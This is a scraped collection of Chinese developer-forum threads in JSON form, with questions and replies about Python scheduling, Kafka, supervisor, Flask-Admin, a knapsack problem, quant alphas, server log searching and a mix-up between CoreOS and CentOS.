{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>fluentd 关于 kafka 配置文件：</p>\n<pre><code>&lt;match&gt; \n\ttype copy \n\t&lt;store&gt; \n    \ttype stdout \n    &lt;/store&gt; \n    &lt;store&gt; \n    \t@type kafka \n    \t@id kafka_output \n    \tbrokers xxx.xxx.xxx.xxx:9092 \n    \tzookeeper xxx.xxx.xxx.xxx:2181 \n        default_topic syslog-topic \n    &lt;/store&gt; \n&lt;/match&gt;\n</code></pre>\n<p>新手还没入门，请指教</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "新手提问： fluentd + kafka 问题： kafka consume 获取不到 fluentd 发送的 message", "comment": []},
{"content": ["<div class=\"topic_content\">比如，有 3 个 py 文件： a.py, b.py, c.py\r<br>\r<br>希望：\r<br>1. 17 ： 00 执行 a.py\r<br>2. 每隔 5 分钟执行 b.py\r<br>3. 每隔 1 天执行 c.py\r<br>\r<br>通过什么包来管理这些任务比较好？\r<br>\r<br>环境： python 2.7, linux/windows</div>"], "reply": "23", "tittle": "求推荐 python 的任务管理的方法", "comment": ["apscheduler", "这样的情况一般用 crontab 最简单把，其他的包什么的估计还得写代码去调度。", "native cron", "  我也是用 crontab ，但是不知道为什么任务根本没执行", "crontab +1", "airflow", "  print 下 log 看看", "一般用 crontab ，\r", "如果你的项目里用 celery 了，可以考虑 celery beat", "这种简单 情况， crontab 最合适,", "crontab 用用就行了", " \r", "我也遇到了手动运行正常 crontab 不执行的问题，后面发现是路径问题，加一个 os.chdir 到工作目录就可以了", "celery", "  简单，好用", "buildbot", "celery", "不想添加依赖，就 crontab ；另外项目的话，可以试试 celery ， apscheduler 。", "个人比较喜欢 ", " ，适合简单的任务，比 apscheduler 更轻", " 手动我也不执行\r", "这个是我的配置文件\r", "\r", "30 23 * * * /home/ubuntu/drogen/starup.sh > /dev/null 2>&1\r", "10 1 * * 6,0 python ~/jdspier/spidermain.py > /dev/null 2>&1\r", "*/1 * * * * /bin/bash /home/cron.sh > /dev/null 2>&1Ø", "buildbot 这种自动构建软件有个好处是能在 web 上看所有 stdio 输出", "crontab 尽量用全路径", "luigi?", "apscheduler 比较方便", "celery beat 可以，不过比较重型了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码</p>\n<pre><code>from pykafka import KakaClient\nclient = KafkaClient(\nzookeeper_hosts='127.0.0.1:2181')\nprint client, dir(client), client.brokers, client.cluster\nprint client.topics\n</code></pre>\n<p>输出</p>\n<pre><code>{'test': None, 'syslog-topic': None}\n</code></pre>\n<p>我在 shell 里面通过</p>\n<pre><code>&gt;&gt;bin/kafka-console-producer.sh --broker-list localhost:9092 --topic syslog-topic\n&gt;&gt;asdkasdjkasjd\n</code></pre>\n<p>输入了一些字符串\n为什么 topics 字典里面还是 None</p>\n</div></div>"], "reply": "4", "tittle": "python 使用 kafka 系列问题 topics 为空", "comment": ["哎呀呀，新手跪求大神帮忙", "消息订阅啊。。。你客户端得去调用订阅。。。", " 我代码里面获取到了这个 topics ，这个字典的 value 是个 none ，不应该是 Topic 对象么？是 Topic 对象的话，才可以去 consume 的吧？", "print client.topics['test'] 有惊喜"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>supervisord 老是报错： app: ERROR (no such process)，不知道是怎么回事，我的 app 配置文件如下：</p>\n<pre> <code>\n[program:app]\ncommand=/bin/env pypy --jit vec=1 ~/myhome/app.py -g min -p 1024\ndirectory=/myhome/user/app/\nautostart=true\nredirect_stderr=false\nuser=ubuntu           \n</code>\n</pre>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><h2>总结一下如下几个原因可能导致失败：</h2>\n<ul>\n<li>进程已经被启动或者是daemon（我后台挂了screen）</li>\n<li>配置文件加载错误，默认使用的配置文件[include]是被注释掉的（ubuntu 14.04）</li>\n<li>命令执行路径不是完整路径或不正确</li>\n</ul>\n</div></div>"], "reply": "12", "tittle": "supervisor 报错被折腾了一整天了", "comment": ["把~换成绝对地址试试？\r", "\r", "去掉 redirect_stderr=false ，然后看一下 supervisorctl tail app 和 supervisorctl tail app stderr 试试？", "debian 系我记得 env 的路径是 /use/bin/env 吧。\r", "而且既然是服务的配置文件，直接写 pypy 的完整路径比较好。", "手机打字错掉了 坑爹的自动拼写纠正。\r", "/usr/bin/env", " \r", " 我试一试", " 还是一样，那个 supervisor 我配置文件放在\"/etc/supervisor/conf.d/\"里面不只有有没影响", "supervisor 管控的是自己的子进程，如果你是手动起的进程，他控制不了，你得把手动启动的进程杀了，再用 supervisor 启动你的进程。林外 supervisor 执行的命令不能是守护进程；就这两点注意就行。", " 我是把配置文件放在项目目录底下的\r", "\r", " ![]( ", " )", "问个话题无关的，  --jit vec=1 这个参数的作用是？ pypy 似乎有很多参数，一直不知道有什么用", "你先手动运行一下 /bin/env pypy --jit vec=1 ~/myhome/app.py -g min -p 1024 这条命令，看一下是不是在后台运行的。我以前遇到过这种问题是因为程序在后台运行的， supervisor 就会认为它没有启动，不断地重启它。", "还有试一下 sudo -u ubuntu \"/bin/env pypy --jit vec=1 ~/myhome/app.py -g min -p 1024\"\r", "\r", "把~展开成绝对路径", " 使用寄存器优化， X86 使用 SSE MMX 寄存器", " 感谢，终于成功了"]},
{"content": ["<div class=\"topic_content\">一个小项目部署成功了，现在使用 http://域名:5000 可以正常访问，但是添加的几个 View\r<br>admin = Admin(app, index_view=MyIndexView(),base_template='admin/my_master.html')\r<br>    admin.add_view(UserView(User,name= u'嘻嘻嘻'))\r<br>    admin.add_view(RespView(Resp,name= u'是是是'))\r<br>    admin.add_view(ReqView(Req,name=u'POST 请求'))\r<br>\r<br>这样的话，在页面上点击首页，会返回到没带 5000 的页面，也就会出错。\r<br>\r<br>\r<br>其中 view 是这么写的\r<br>class MyIndexView(AdminIndexView):\r<br>    @<a target=\"_blank\" href=\"/member/expose\">expose</a>('/')\r<br>    def index(self):\r<br>\r<br>        if not current_user.is_authenticated():\r<br>            return redirect(url_for('.login'))\r<br>            return super(MyIndexView, self).index()\r<br>        return redirect(url_for('.login'))\r<br>\r<br>求指导。</div>", "<div class=\"topic_content\">已经解决。参考：\r<br>\r<br><a target=\"_blank\" href=\"http://stackoverflow.com/questions/23649444/redirect-subdomain-to-port-nginx-flask?s=1%7C1.3658\" rel=\"nofollow\">http://stackoverflow.com/questions/23649444/redirect-subdomain-to-port-nginx-flask?s=1|1.3658</a></div>"], "reply": "6", "tittle": "FLASK-ADMIN 部署成功，但是修改了默认端口 80 为 5000，那么问题来了。", "comment": ["那到底报啥错了？", "没报错。举个例子。\r", "我的网站首页是 ", "\r", "nav 导航栏有 4 个内容，都是通过 view 出来的，首页，页面 1 ，页面 2 ，页面 3.\r", "\r", "页面 1 ，页面 2 ，页面 3 里面有 edit 和 create 操作，这些都可以正常访问。\r", "但是当点击首页，或者点击修改活创建数据按钮之后，会自动返回到一个页面哈。\r", "这个时候他就会跳到 ", "因为页面网站 nxgin 绑定了 5000 访问哈", "gunicorn+nginx 反向代理+flask, 用 flask-admin 从没遇到过问题。。。", " 你有改项目的默认端口没？   80 端口没有问题，改成 5000 的时候出现了", " flask+gunicorn 一直用 5000 端口，然后被 nginx 反向代理为 80 端口。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原文是这样的：</p>\n<p>顺丰速运，全货机专机运输，提供高效的便捷服务，更快更安全!</p>\n<p>首先，是快捷的时效服务。自有专机和 400 余条航线的强大航空资源以及庞大的地面运输网络，保障客户的快递在各环节最快发运。</p>\n<p>其次，是安全的运输服务。顺丰速运自营的运输网络，给消费者提供标准、高质、安全的服务。</p>\n<p>由此，顺丰速运在消费者的心中留下了完美的形象，从而提高了企业的业绩，也奠定了其在整个快递领域中的基础。</p>\n<p>顺丰快递每天能收到成千上万的物流单，每个物流单的重量不一。 现在顺丰快递的货车司机隔壁老王开着顺丰的标配货车（限载 5 吨，含 5 吨，不考虑限高）,想要一次性拿走尽可能重的货物，这些货有红木沙发，有钢材等等。</p>\n<p>以下是货物清单：</p>\n<p>货物编号\t货物重量(单位:kg)\n1\t509\n2\t838\n3\t924\n4\t650\n5\t604\n6\t793\n7\t564\n8\t651\n9\t697\n10\t649\n11\t747\n12\t787\n13\t701\n14\t605\n15\t644</p>\n<p>然后给上我的代码。</p>\n<pre><code>l=[509,838,924,650,604,793,564,651,697,649,747,787,701,605,644]\nmaxs=0\ndef getnum(i,num):\n    if i&gt;=14 and l[14]+num&gt;5000:\n        return num\n    elif i&gt;=14 and l[14]+num&lt;=5000:\n        return num+l[14]        \n    if l[i]+num&gt;5000:\n        return getnum(i+1,num)\n    else:\n        return getnum(i+1,num+l[i])\nfor i in range(len(l)):\n    temp=getnum(i,0)\n    if temp&gt;maxs:\n        maxs=temp\nprint (maxs)\n</code></pre>\n<p>但是算出来 4978 也不知道是哪里出问题了。欲哭无泪。</p>\n</div></div>"], "reply": "23", "tittle": "python 老王装货", "comment": ["我自己知道了。只取到了组合结果，但是没有取到最优化结果。", "这玩意我能想到的就是穷举，从第一个开始，和后面的数字逐个相加，然后找出最接近的", "看了代码风格就不想读了（忽略我", "4991?", "这 tm 不就是个背包问题吗\r", "\r", "推荐《背包九讲》", "补上链接 ", "\r", "做这题看第一讲 0-1 背包就行了", "动态规划问题不能用几个 if else 解决的", "重温一下当年那个熟悉的递推公式：\r", "dp[i][j] = max(dp[i-1][j], dp[i-1][j-weight[i]] + value[i])\r", "dp[i][j]表示考查到第 i 个物品且背包容量为 j 时，背包所具有的最大价值", "PS: 当然这个问题规模并不大，穷举的复杂度也不过是 O(2^15)", "动态规划问题，找到递推公式，然后打标记，\r", "这种问题 if else 搞不定的，", "说错了不是 if else 搞不定，如果问题规模不大的时候，\r", "\r", "穷举的是比较好 而且比较明智的算法", " \r", "穷举的复杂度应该是  C(15/1)+C(15/2)+ ... +C(15/15)\r", "\r", "我不知道结果是不是  O(2^15) ，高中数学没学好，别见怪", " (a+b)^n 二项式展开一下就是你的结果，其中， a = b = 1", " 好吧，我果然高中数学忘光了 ^_^", " 讲道理，遇到这种问题，\r", "我还真是喜欢穷举，一来是简单，二来，问题规模不大的时候，前者易懂 \r", "也不容易写错，调试也方便", " 所谓穷举无非就是穷举每个物品取或者不取的所有组合情况。\r", "对每个物品而言，取或者不取意味着具有 2 中不同的状态，\r", "所以如果有 n 个物品，所有状态的组合自然就是 2^15 种，对吧？\r", "穷举的实现方式就很多了，可以搜索，也可以枚举， etc. 就看个人的习惯了。", "[838, 793, 564, 651, 697, 747, 701]\r", "sum = 4991\r", "现在的程序员连背包问题都不知道了吗", "这个代码是典型的背包贪心错误。", "```\r", "v = [509,838,924,650,604,793,564,651,697,649,747,787,701,605,644]\r", "dp = [0] * 5001\r", "\r", "for i in xrange(0, len(v)):\r", "    for j in reversed(xrange(1, 5001)):\r", "        if j - v[i] >= 0:\r", "            dp[j] = max(dp[j], dp[j - v[i]] + v[i])\r", "print dp[-1]\r", "\r", "\r", "```", "v = [509,838,924,650,604,793,564,651,697,649,747,787,701,605,644]\r", "    dp = [0] * 5001\r", "\r", "    for i in xrange(0, len(v)):\r", "        for j in reversed(xrange(1, 5001)):\r", "            if j - v[i] >= 0:\r", "                dp[j] = max(dp[j], dp[j - v[i]] + v[i])\r", "    print dp[-1]", "这个问题等价于从一个集合中选取一个最大子集和问题，是一个 NP 问题，找最优值恐怕只能穷举。贪心算法恐怕只能达到一定的近似度。", "当然也等价于背包问题，可以使用背包问题的经典动态规划算法，一般的输入规模还是能较快算出结果的。"]},
{"content": ["<div class=\"topic_content\">收费标准里面的： 150k ， 1M ， 3M ， 9M 指的是带宽还是请求次数？\r<br>谢谢！</div>"], "reply": "2", "tittle": "V 友有过 crawlera 的没，请问效果怎么样？", "comment": ["请求次数", " 谢谢！跟 crawlera 确认了，是请求次数。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>求给点思路</p>\n<p>几十台服务器，同样的路径，我需要看看 log 文件里面有没有出现 127.0.0.1 这个 ip</p>\n</div></div>"], "reply": "20", "tittle": "想用 python 获取几十台服务器日志中指定关键词内容", "comment": ["ansible", "elk", "不建议用 python 搜索关键词，可以用 python 把文件拿过来用文本工具进行搜索", "还不如脚本 ssh 挨个上去 grep '127.0.0.1'然后回传或者写入新文件呢", "for ssh grep 不久完了", "salt(salt-ssh)、 ansible 不好么， grep 出来，然后放到共享目录里", "加上 xargs -P 可以并发哦。", "ansible", "楼主，我给你总结一下你的需求？\r", "\r", "“如何管理大量服务器集群？”", "paramiko 可破", " 这么点小需求，用 elk 学习成本太高了\r", "cat /your/dir/*.log | sort | uniq | xargs -n 10 | grep -e \".*127.0.0.1.*\"，如果是远程的话可以用 rsync 同步一下就行了", "简单的需要。找一台跳板机，添加信任。然后登录到各个机器上去执行 grep", "polysh", "ansible playbook or command module", "pssh", "fabric", "1. 如果是一次性需求，用 Ansible\r", "2. 如果是持续需求，把日志推到 ", " 然后为 127.0.0.1 这个关键词设定一个 alert", "和楼主有类似德需求，用 ruby 写了一个工具，自己用的顺手。", "嗯 同 15 楼， 建议 Ansible + log 分析"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"http://p1.bqimg.com/567571/089cc95c4869ef70.png\"></p>\n<p>2015 年底<strong>World Quant</strong>发表了论文<strong>《 101 Formulaic Alpha 》</strong>，论文中给出了 101 个<strong>现实中</strong>的 alpha 。</p>\n<p>原文 pdf ：\n<a href=\"https://arxiv.org/pdf/1601.00991.pdf\" rel=\"nofollow\">https://arxiv.org/pdf/1601.00991.pdf</a></p>\n<p>—— We emphasize that the 101 alphas we present here are not “ toy ” alphas but real-life trading alphas used in production.  In fact, 80 of these alphas are in production as of this writing.\n<strong>其中强调 80%都仍在使用（当然，这个信着先吧....）。</strong></p>\n<p>论文中还科普了一下 alpha 的简单分类，也就回答了一下收益能解释关联程度等一些问题，其中这些 alpha 是可以做空使用的，但是在大 A 股方面做空需要比较复杂，这里只实现做多的一面，然后阶级止损。</p>\n<p>在 Appendix A ：分为了两部分</p>\n<pre><code>   A.1 是 101 个 alpha 的计算公式和使用的函数的定义和解释，其中一部分的函数解释：\n</code></pre>\n<p>rank(x) 是一个排名的函数</p>\n<p>abs(x) ， logx)， sign(x)都是按照命名定义的函数分别是绝对值，对数还有信号函数</p>\n<p>delay(x,d)  在 d days 以前的 x 的值</p>\n<p>delta(x,d)   今天的 x 值减去 d 天以前 x 的值</p>\n<p>correlation(x,y,d) 在过去长度为 d 天， x 和 y 的相关性</p>\n<p>covariance(x,y,d) 在过去长度为 d 天， x 和 y 的协方差</p>\n<p>ts_min(x,d)， ts_max(x,d) 时间序列函数， d 天内的最小值和最大值</p>\n<p>ts_argmax(x,d)， ts_argmin(x,d)是计算 ts_min(x,d)， ts_max(x,d)发生在哪一天</p>\n<pre><code>    A.2.部分是描述了我们需要输入的一些数据，大部分跟名字相关。\n</code></pre>\n<p>returns 每日收盘之后的收益</p>\n<p>open ， close ， high ， low ， volume 对应是开盘价，收盘价，最高价和最低价还有成交量。</p>\n<p>vwap 成交量加权平均价</p>\n<p>cap   市值</p>\n<p>adv(d)  d 天的平均成交额</p>\n<p>还有部分的工业指数（这是美国市场方面的）</p>\n<p>我们使用了其中的单因子 alpha 2 来对 399968 创业成长成份股进行了回测（我们自己添加了阶级止损的方法），然后收益率是很可观的。</p>\n<p>alpha2 ：(-1*correlation(rank(delta(log(volume),2)),rank(((close-open)/open)),6))</p>\n<p><strong>嗯...就是用-1 去乘一个 6 天的相关系数</strong>。</p>\n<p><strong>相关系数的 x</strong>是成交量的 rank(delta(log(volume),2)) 也就是当天成交量的对数和 2 天前的成交量对数的差值的排名~</p>\n<p><strong>相关系数的 y</strong>就是 rank(((close-open)/open))，收盘价减去开盘价的差去除以开盘价的一个排名~</p>\n<pre><code>     （我知道这很拗口而且也神难懂，所以我们就有了文末的亮点~）\n</code></pre>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/cdb7bba543d717ea.png\"></p>\n<p>代码方面：</p>\n<p>alpha ：</p>\n<p><img alt=\"\" src=\"http://p1.bqimg.com/567571/581f2bdee41c64b2.png\"></p>\n<p>每天初始化：</p>\n<p><img alt=\"\" src=\"http://i1.piimg.com/567571/f97fb10c0252972d.jpg\"></p>\n<p>买卖：</p>\n<p><img alt=\"\" src=\"http://i1.piimg.com/567571/30f93bbc2120ea2f.jpg\"></p>\n<p>最后收益图：</p>\n<p><img alt=\"\" src=\"http://i1.piimg.com/567571/7ff7790212b6b903.jpg\"></p>\n<p>亮点：</p>\n<p>我们<strong>Ricequant 已经把其中的 60 个 Alpha 写成了一个 demo</strong>，我们已经把 alpha 都写进去了，每一个 alpha 都可以独立使用，但是我们鼓励大家去使用这些 Alpha 去做一个组合。\n比如说：</p>\n<p>alpha 1 和 alpha 40 去做一个组合，经过各自的回测，我希望看看在 alpha 1 与 alpha 40 的权重比设置为 30%和 70%的情况，会是怎么样的呢？</p>\n<p>对 alpha 值进行计算获得一个新的 alpha 也是可以的。</p>\n<p>使用方法：\n在 before trading 中设置 alpha_use=alpha.alpha002()的时候更改后面数字的部分就可以使用不同的 alpha ，但是注意不同的 alpha 返回的数值可能是 NaN 或者是负数，要另作处理呢。</p>\n<p>有基础的同学如果使用多因子的话，就要自己手动去增加多个 alpha_use 然后去计算结果根据自己的方法去回测啦~</p>\n</div></div>", "<div class=\"topic_content\">策略源码和一键克隆，还请到策略原帖： <a target=\"_blank\" href=\"https://www.ricequant.com/community/topic/2129\" rel=\"nofollow\">https://www.ricequant.com/community/topic/2129</a></div>"], "reply": "1", "tittle": "来自 WorldQuant 的 101 个 Alpha", "comment": ["策略源码和一键克隆，还请到策略原帖： "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如导入结巴分词,代码如下:<br>\n<code>import jieba # 引入母模块-很土的名字,不知道是否有专业名字?</code><br>\n然后直接使用结巴的子模块 posseg 来标注词性,代码如下:<br>\n<code>jieba.posseg.cut('中文词性标注') # 这句报异常:</code>\n<code>#=&gt;AttributeError: 'module' object has no attribute 'posseg'</code></p>\n<p>必须这样导入子模块,才能使用:<br>\n<code>from jieba import posseg</code><br>\n<code>posseg.cut('中文词性标注') # 这句正常调用</code></p>\n<p>看到常说推荐直接导入母模块,以防止命名空间污染;而且一般如:<br>\n<code>from a import b</code><br>\n<code>b.func('中文词性标注')</code><br>\n这样格式的代码,都能转为这样来使用:<br>\n<code>import a</code><br>\n<code>a.b.func('中文词性标注')</code><br>\n但为什么 jieba 结巴分词却不能这样呢?这是什么原因呢?<br>\n感谢您的回复!</p>\n</div></div>"], "reply": "2", "tittle": "python import 导入模块的时候为什么引用不了子模块?", "comment": ["这个第三方模块在__init__.py 中做处理才能那么用", "如果 a 是个目录， b 是个 b.py 文件， func 是 b.py 里的函数， a 目录里有空的 __init__.py ：\r", "\r", "import a # 没问题\r", "import a.b # 没问题，会在这一句找 a/b.py\r", "result = a.b.func() # 正常\r", "\r", "重来一遍：\r", "import a # 没问题\r", "result = a.b.func() # 不行， a 下面并没有 b"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>购买阿里云后选择的是他推荐的 Centos 系统。</p>\n<p>首相想要尝试装一个 python 运行环境\n在尝试的过程中各种常用的安装命令都没有，比如 make,yum,apt-get.\n目前唯一能用的就是 wget</p>\n<p>在 google 中搜索 Linux 安装 yum ，等都是几年前的帖子了。\nSo ，不知道原因的我一脸萌比到这里发帖了。。。</p>\n</div></div>"], "reply": "59", "tittle": "服务器新手，购买了阿里云之后，各种安装命令都没有？", "comment": ["我怎么不太相信 centos 没有 yum 呢", "是 root 用户登陆的么？不会是没有权限吧", "  我用的 mac Shell 连接的阿里云服务器。然后出现\r", "******************~ # yum\r", "bash: yum: command not found", "登录后台重装系统，你这个看起来环境没配置好", " 已经试过重新装系统了", "我有一次也遇到过这种情况，重装就好。", "你装的是哪个版本的 centos", "我觉得更应该提交工单，这属于售后问题。\r", "centos 没有 apt-get ，这是 ubuntu 的安装命令。", "... 反馈下吧。不过我用的是 ubuntu 当然它是带有 apt-get :D", "是不是选成 CoreOS 了。。。", "显然你命令前面没加 sudo 啊", " 没加 sudo 的话应该会提示拒绝访问，但 po 主碰到的提示是指令不存在", "CentOS 怎么可能没有 yum 。我也猜楼主把 CoreOS 当成了 CentOS 了。", "很久以前在阿里云上碰见个啥命令都没有的系统，心有余悸啊", " \r", " 碰巧的是， CoreOS 就是这么一个发行版，不带任何包管理器，自带程序很少，专门设计成跑 container 的。理论上讲，云服务商的部署都是直接用的镜像，除非镜像损坏（还能正常开机使用），这得是多小的概率啊", "不会吧？我也是用过 centos 的 yum\r", "先尝试重做系统吧 反正工单是指望不上了", "wget 下载一个 yum 的 rpm 包手动安装呗", "执行 lsb_release -a 看看是什么发行版", "阿里云的 CentOS 装完默认就是 root 用户，不加 sudo 也可以使用域名，目测楼主不是 CentOS...", "更正：使用 yum", "1000 万 1000 万", " 没看前面前缀吗？已经 root 登陆了", "centos 没有 yum ，你骗谁呢", "楼主要不要 po 一个 lsb_release -a ?", "楼主明显系统不对\r", "阿里的 centos 默认命令都有的  不是 minimal 版本", " 被限制使用了吧", "要是学习，或者开发的话，买什么阿里云，买个 2 、 3k 的 miniserver 玩的更爽。", " 明显楼主装错系统了。 mini 版本也有 yum 。", "散了散了，自从有人回复 CoreOS 楼主就没回复了", " 请无视，没注意到已经 root 登陆了", "发现阿里跟腾讯跟一样脑残， CoreOS 一直摆在 centos 的隔壁", "centos 没有 yum ……逗谁呢……\r", "就算是搬瓦工的 64M 内存装 centos 都有 yum ……", "怀疑楼主已经默默的吧 coreos 换成了 centos ～ ～", " 然后就离开 v2 了 哈哈", " 简直太 机智了，利马揭穿文盲楼主……", "  你们太机智了", "  如你所说的却是选错了", "233333", "一定是选错了， lz 用的是 coreos ，学起来", "阿里的服务器 买的时候很好 ，出了问题死都承认是自己的是事，赔偿 100 倍就是放屁", "所以说学好英文多重要。否则连系统都装错。", "啥都没有，也不能没有 yum 啊。。。这还用个毛啊。。。。", " 上次我在 vultr 上开了一个服务器，当时想选 centos7 。结果选了 CoreOS  。然后我一直 yum 就是失败，网上找了很多方法都不行。 然后呢，我打算重装系统，进入到控制面板，我发现我 TM 选错系统了。", "   哈哈，我也一样", "centos != centos ，年轻人就想搞个大新闻", "阿里云的 cetnos 有 yum 啊", " 然后呢？ yum install 安装？", "Google digitalocean centos tutorial", "CoreOS 学起来啊~", "楼主已经获得全场最佳。", "CoreOS 好玩吗", "一不注意就搞了个大新闻", " 相同的字符串还能代表 2 个系统咩？真是大新闻\r", "\r", " ", " 哈哈", " \r", ">>> 'centos' == 'centοs'\r", "False\r", "\r", "手動滑稽（→_→）", "重装了几个系统就因为不能远程连接 MySQL 最后发现以前把安全组里 3306 关了", "2333 果然是选错了系统", "阿里云表示太特么冤了，你是来黑我的吧。哦，原来不是，年轻的猎手选错了猎物而已。", "哈哈哈哈 我也有一次选错了。。"]},
{"content": ["<div class=\"topic_content\">今天发现 pylons 官网改版，相比原来，现代感多了些。 <a target=\"_blank\" href=\"http://pylonsproject.org/\" rel=\"nofollow\">http://pylonsproject.org/</a>\r<br>\r<br>大家有谁在用这个框架（ pylons pyramid ）吗，我也是昨天看知乎的时候，看到说豆瓣有些地方在用这个框架；也看到有人说，这个框架比较适合用在工业生产上，工业生产用 Django 的案例也有，单独说 pylons pyramid 适合工业生产，这其中是有什么独到的地方吗？</div>"], "reply": "5", "tittle": "pylons（ pyramid）官网改版了", "comment": ["这些从 zope 出来的人, 挖坑弃坑很厉害, 话说, 现在的开发模式, 真没有必要用 full stack 的框架了, 自己组合省心的多", " 是因为这个原因， flask 才成为大家喜欢的后起之秀吗？", "Python 是胶水语言，那 flask 算是胶水框架吧😄", "如果搞 pylons/zope 这么麻烦，为何不用 Java?", "时代的眼泪，没人用了吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近看了《 python 源码分析》，里面提到了 python 的小整数对象池和大整数对象池，然后我发现，如果我在解释器上直接运行：</p>\n<pre><code>&gt;&gt;&gt; a = 10000\n&gt;&gt;&gt; b = 10000\n</code></pre>\n<p>那么 <code>id(a)</code> 和 <code>id(b)</code>是不一样的。</p>\n<p>但是如果我写个<code><a href=\"http://main.py\" rel=\"nofollow\">main.py</a></code>去跑，那么<code>id(a)</code>和<code>id(b)</code>又是一样的了，是因为交互解释器没有用到大整数对象池吗？还是因为 py 文件在编译的时候做了优化？</p>\n</div></div>"], "reply": "4", "tittle": "关于 python 大整数对象池", "comment": ["如果我没猜错的话， 模块里面应该是 const 值， 然后 a,b 都指向这个\r", "而在 repl 的时候， 每次都是创建的， repl 中不识别出 1000 是 const", " \r", "\r", "我也在看。不过很奇怪的是，这段代码里并没有根据值去寻找已存在的大整数。所以按照代码来看应该是就算是数值\r", "相同的两个大整数，应该是每次都返回不同的地址才对。", "这个问题应该是楼主问的吧， ", "\r", "答案 R 大给出了一个", " 对，是我问的，。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>我有两个 list ， list 里面分别有 n 个字典，然后我想得到两个 list 里面 key 相同但是值不同的元素，大致结构如下：</h2>\n<pre>  <code>\n       a_list = [{'100024': 100}, {'102234':996}...]\n       b_list = [{'100024': 200}, {'102234':996}...]\n  </code>\n</pre>\n<h3>但是这里字典里面的 key 是不固定的，但是两个 list 的所有元素的 key 是相同的（话有点绕，我也不知道怎么表达），当 a_list 的中的 100024 和 b_list 中的 100024 的值得不同的时候如何能快速比较出来呢(两个 list 里面的元素在百万级别左右)，目前我用的 map/cmp 实在太慢了，不知道有没有更高效的办法</h3>\n</div></div>"], "reply": "15", "tittle": "怎么能高效比较两个 list 里面字典的值是否相同呢？", "comment": ["我能想到的就是 sort 两个 list ，再遍历比较。 O(nlgn)", "一个简单粗暴的思想，\r", "a_key_list ， b_key_list 求交集 C\r", "a_list ， b_list 求差集 D\r", "C ， D 求交集 E\r", "E 即你需要的结果， O(n)", "另外，为什么要 list 套 map 呢，直接一个大 map 不是好维护多了", " 之前设计问题不好变动了", "设计问题没有太好的解， list 这个数据结构决定了这个问题只能 O(n logn)，因为快排是这个效率\r", "而不排序的话更惨，最低不小于 O(n^2)\r", "\r", " 已知两个 list 有序的情况下，不要从头遍历，从上一个位置继续就行\r", "O(n)", "如果只是想判断是不是完全一样，那么可以对 list 中的字典内容进行 hash ，比较 hash 值。如果还想知道哪个字典值不一样，那么可以用 merkle tree 的思想", "忽略我上面的回复吧，感觉我理解错问题了。", "很简单,把列表转换成单个字典就行了\r", "然后直接比较", " sort 之后二分就好了", "第一如果是 顺序链表 可以随机访问，很简单 只要 sort 之后 二分就行了\r", "O(nlogn)", "a_list = [{'100024': 100}, {'102234': 996}]\r", "b_list = [{'100024': 200}, {'102234': 996}]\r", "\r", "a_dict = dict((k, dic[k]) for dic in a_list for k in dic)\r", "b_dict = dict((k, dic[k]) for dic in b_list for k in dic)\r", "\r", "common = dict((k, (a_dict[k], b_dict[k])) for k in a_dict if k in b_dict)\r", "\r", "print(common) # = {'100024': (100, 200), '102234': (996, 996)}", "归并排序不是专门干这个的吗", "题注你好，我给你一种参考。\r", "\r", "将 a 字典进行 hash （ key ）%100 ，这里看你数据大小，如果数据没那么大，也可以 hash （ 30 ），得到 100 种不同的 key ，分别存入 100 个文件（标记为 a001 ， a002...a100 ，如果不是特别大，也可以直接在内存中用）。用相同的方法处理文件 b 。\r", "\r", "这样之后，只有 a001 和 b001 两个文件存在 key 相同的元素，然后遍历起来可能快一些（相比于将 a 中一个 key 去和 b 中所有 key 遍历，我们每次只遍历了 1/100 ）。分成的文件越多，遍历速度越快。", " hash 分桶？", " 是的"]},
{"content": ["<div class=\"topic_content\">最近在网上看了廖雪峰老师的教程，前期也求了不少书，但是各位大侠很多都是 E 文版本，有没有靠谱的中文版书推荐 ， python 能做的事情很多，我个人还是偏向于网络和脚本应用，谢谢。</div>"], "reply": "24", "tittle": "python 的中文书籍求推荐，上次推荐了很多，但是 E 文多，我 E 文不是很好。", "comment": ["有编程基础加上略懂 http 协议就能立马上手。", "可能你中文也不好，能不能说普通话？", "在亚马逊上找本 4 星评价以上的中文入门书籍。或者网友翻译的“笨方法学 Python ”，我是看这本书入门的。能够出书畅销的教程比较适合大众。\r", "看网上的免费教程坑多，而且不系统，容易半途放弃，看似简单易懂，实则搞完之后还是发现什么都不懂。", "Python 编程快速上手——让繁琐工作自动化\r", "这本书看下第一部，然后直接跳 11 章", "讲道理，编程技术类的书籍不难，比社科类好很多\r", "如果可能，还是去学个英语比较好，至少可以直接看官方文档", "参考链接： ", "\r", "\r", "另推荐《 python 学习手册$", "\r", "这个参考。", "看完廖雪峰可以看 Python cookbook\r", "网络可以看 Python 网络编程\r", "脚本可以看 5 楼推荐", "我看过最好的书是 python cookbook 。推荐先看 python 核心编程（会不会被人指责太老了……），认真的了解 python 的方方面面是极好的。\r", "\r", "接下来就可以一边编程一边看 cookbook 了，这本书每一节围绕一个需求来提出一个个解决方法，然后总结这些方法怎么样（很多名字用 cookbook 的书都是这种风格，从实际问题中学习，很喜欢！）。如果能掌握这本书解决的这些问题，理解解决问题的方式，估计 python 就会很厉害了。\r", "\r", "结合 python 的文档，也可以用 ide 去看看相关的源代码。", "E 文是什么文？", "Python 进阶》（《 Intermediate Python 》的中译本）\r", "入门靠看书，进阶靠实践", "最好是先学英文。", " english 嘛", "E 文是什么文？", "Python 网络数据采集， ", "\r", "\r", "用 Python 写网络爬虫， ", "最好是先学英文。 up @", " \r", " \r", "如何学好英文", " 好多中文教程，赞", " 给你点个赞支持一下", "Dive into python 2 ， 3 都有， 中文版也有， 5 星级推荐的", " 入门靠看书，进阶靠实践"]},
